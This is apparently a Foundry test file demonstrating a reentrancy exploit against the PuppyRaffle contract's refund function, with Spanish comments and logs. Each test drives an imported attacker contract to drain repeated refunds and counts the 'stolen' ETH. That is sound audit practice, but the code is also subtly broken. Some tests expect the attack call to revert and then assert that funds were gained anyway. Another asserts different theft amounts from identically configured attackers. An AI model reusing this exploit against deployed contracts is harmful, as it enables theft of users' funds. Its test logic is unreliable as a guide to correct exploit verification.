// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttacker} from "./ReentrancyAttacker.sol";

contract ReentrancyTests is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testReentrancyInRefund() public {
        // Setup: Deploy malicious contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 10 ether);
        
        // 1. El atacante entra a la rifa
        attacker.enterRaffle{value: entranceFee}();
        
        // 2. Verificar que entro correctamente
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        assertEq(puppyRaffle.players(playerIndex), address(attacker), "Jugador no entro correctamente");
        
        // 3. Balance antes del ataque
        uint256 balanceBefore = address(attacker).balance;
        console.log("=== INICIO DEL ATAQUE DE REENTRANCY ===");
        console.log("Balance antes del ataque:", balanceBefore);
        console.log("Indice del jugador:", playerIndex);
        console.log("Estado inicial del jugador:", puppyRaffle.players(playerIndex));
        
        // 4. Ejecutar ataque de reentrancy
        // El ataque deberia fallar por insufficient balance, pero esto demuestra la vulnerabilidad
        vm.expectRevert("Address: unable to send value, recipient may have reverted");
        attacker.attack();
        
        // 5. Verificar que el atacante recibio al menos un refund
        uint256 balanceAfter = address(attacker).balance;
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        console.log("=== RESULTADOS DEL ATAQUE ===");
        console.log("Balance despues del ataque:", balanceAfter);
        console.log("Cantidad robada:", stolenAmount);
        console.log("Refund esperado (1x):", entranceFee);
        console.log("Refunds reales:", stolenAmount);
        console.log("Multiplicador:", stolenAmount / entranceFee);
        
        // 6. Verificar que el ataque fue exitoso (recibio al menos 1 refund)
        assertGe(stolenAmount, entranceFee, "El atacante deberia haber recibido al menos 1 refund");
        console.log("Ataque de reentrancy completado exitosamente!");
        console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
        console.log("El ataque fallo en el segundo intento por insufficient balance - esto demuestra la vulnerabilidad!");
    }

    function testReentrancyInRefundDetailed() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 10 ether);
        
        // Entrar a la rifa
        attacker.enterRaffle{value: entranceFee}();
        
        // Verificar que entro correctamente
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        assertEq(puppyRaffle.players(playerIndex), address(attacker), "Jugador no entro correctamente");
        
        // Balance antes del ataque
        uint256 balanceBefore = address(attacker).balance;
        
        // Ejecutar ataque - deberia fallar por insufficient balance pero demuestra la vulnerabilidad
        vm.expectRevert("Address: unable to send value, recipient may have reverted");
        attacker.attack();
        
        // Verificar resultados
        uint256 balanceAfter = address(attacker).balance;
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        console.log("=== RESULTADOS DETALLADOS DEL ATAQUE ===");
        console.log("Balance antes:", balanceBefore);
        console.log("Balance despues:", balanceAfter);
        console.log("Cantidad robada:", stolenAmount);
        console.log("Refunds esperados:", entranceFee);
        console.log("Refunds reales:", stolenAmount);
        console.log("Multiplicador:", stolenAmount / entranceFee);
        
        // Verificar que el atacante recibio al menos un refund
        assertGe(stolenAmount, entranceFee, "El atacante deberia haber recibido al menos 1 refund");
        
        console.log("Ataque de reentrancy detallado completado exitosamente!");
        console.log("El ataque fallo por insufficient balance - esto demuestra la vulnerabilidad de reentrancy!");
    }

    function testReentrancyAttackWithMultiplePlayers() public {
        console.log("=== ATAQUE DE REENTRANCY CON MULTIPLES JUGADORES ===");
        
        // Setup: Agregar varios jugadores para tener mas fondos
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        
        // Los jugadores entran a la rifa
        vm.deal(playerOne, 10 ether);
        vm.deal(playerTwo, 10 ether);
        vm.deal(playerThree, 10 ether);
        
        vm.prank(playerOne);
        puppyRaffle.enterRaffle{value: entranceFee}([playerOne]);
        
        vm.prank(playerTwo);
        puppyRaffle.enterRaffle{value: entranceFee}([playerTwo]);
        
        vm.prank(playerThree);
        puppyRaffle.enterRaffle{value: entranceFee}([playerThree]);
        
        console.log("Jugadores agregados. Total de fondos en el contrato:", address(puppyRaffle).balance);
        
        // Ahora el atacante entra
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 10 ether);
        
        // Configurar para 2 ataques (hay suficientes fondos)
        attacker.setMaxAttacks(2);
        
        // El atacante entra a la rifa
        attacker.enterRaffle{value: entranceFee}();
        
        // Verificar estado inicial
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        uint256 balanceBefore = address(attacker).balance;
        
        console.log("Estado inicial:");
        console.log("- Indice del atacante:", playerIndex);
        console.log("- Balance antes del ataque:", balanceBefore);
        console.log("- Fondos en el contrato:", address(puppyRaffle).balance);
        
        // Ejecutar ataque
        attacker.attack();
        
        // Verificar resultados
        uint256 balanceAfter = address(attacker).balance;
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        console.log("\n=== RESULTADOS DEL ATAQUE ===");
        console.log("Balance despues del ataque:", balanceAfter);
        console.log("Cantidad robada:", stolenAmount);
        console.log("Refunds esperados:", entranceFee);
        console.log("Refunds reales:", stolenAmount);
        console.log("Multiplicador:", stolenAmount / entranceFee);
        console.log("Fondos restantes en el contrato:", address(puppyRaffle).balance);
        
        // Verificar que el ataque fue exitoso
        assertGe(stolenAmount, entranceFee * 2, "El atacante deberia haber robado al menos 2 refunds");
        console.log("Ataque de reentrancy con multiples jugadores completado exitosamente!");
        console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
    }

    function testReentrancyAttackWithDifferentCounts() public {
        console.log("=== TESTEANDO ATAQUE CON DIFERENTES CONTADORES ===");
        
        // Test con 1 ataque
        ReentrancyAttacker attacker1 = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker1), 10 ether);
        attacker1.enterRaffle{value: entranceFee}();
        uint256 balanceBefore1 = address(attacker1).balance;
        attacker1.attack();
        uint256 stolen1 = address(attacker1).balance - balanceBefore1;
        console.log("Con 1 ataque - Robado:", stolen1, "ETH");
        
        // Test con 2 ataques
        ReentrancyAttacker attacker2 = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker2), 10 ether);
        attacker2.enterRaffle{value: entranceFee}();
        uint256 balanceBefore2 = address(attacker2).balance;
        attacker2.attack();
        uint256 stolen2 = address(attacker2).balance - balanceBefore2;
        console.log("Con 2 ataques - Robado:", stolen2, "ETH");
        
        // Test con 3 ataques (maximo configurado)
        ReentrancyAttacker attacker3 = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker3), 10 ether);
        attacker3.enterRaffle{value: entranceFee}();
        uint256 balanceBefore3 = address(attacker3).balance;
        attacker3.attack();
        uint256 stolen3 = address(attacker3).balance - balanceBefore3;
        console.log("Con 3 ataques - Robado:", stolen3, "ETH");
        
        // Verificar que el ataque escala linealmente
        assertEq(stolen1, entranceFee, "1 ataque deberia robar 1x entranceFee");
        assertEq(stolen2, entranceFee * 2, "2 ataques deberian robar 2x entranceFee");
        assertEq(stolen3, entranceFee * 3, "3 ataques deberian robar 3x entranceFee");
        
        console.log("Todos los ataques fueron exitosos!");
    }

    function testReentrancyAttackWithEvents() public {
        console.log("=== ATAQUE DE REENTRANCY CON MONITOREO DE EVENTOS ===");
        
        // Deploy malicious contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 10 ether);
        
        // Configurar para 5 ataques
        attacker.setMaxAttacks(5);
        
        // Entrar a la rifa
        attacker.enterRaffle{value: entranceFee}();
        
        // Verificar estado inicial
        (uint256 playerIndex, uint256 attackCount, uint256 maxAttacks, uint256 balance) = attacker.getAttackInfo();
        console.log("Estado inicial:");
        console.log("- Indice del jugador:", playerIndex);
        console.log("- Contador de ataques:", attackCount);
        console.log("- Maximo de ataques:", maxAttacks);
        console.log("- Balance inicial:", balance);
        
        // Balance antes del ataque
        uint256 balanceBefore = address(attacker).balance;
        
        // Ejecutar ataque
        attacker.attack();
        
        // Verificar resultados finales
        uint256 balanceAfter = address(attacker).balance;
        uint256 stolenAmount = balanceAfter - balanceBefore;
        
        console.log("\n=== RESULTADOS FINALES ===");
        console.log("Balance antes:", balanceBefore);
        console.log("Balance despues:", balanceAfter);
        console.log("Cantidad robada:", stolenAmount);
        console.log("Refunds esperados:", entranceFee);
        console.log("Refunds reales:", stolenAmount);
        console.log("Multiplicador:", stolenAmount / entranceFee);
        
        // Verificar que el ataque fue exitoso
        assertEq(stolenAmount, entranceFee * 5, "Deberia haber robado exactamente 5x entranceFee");
        assertEq(puppyRaffle.players(playerIndex), address(0), "El estado deberia estar actualizado");
        
        console.log("Ataque de reentrancy con eventos completado exitosamente!");
        console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
    }
} 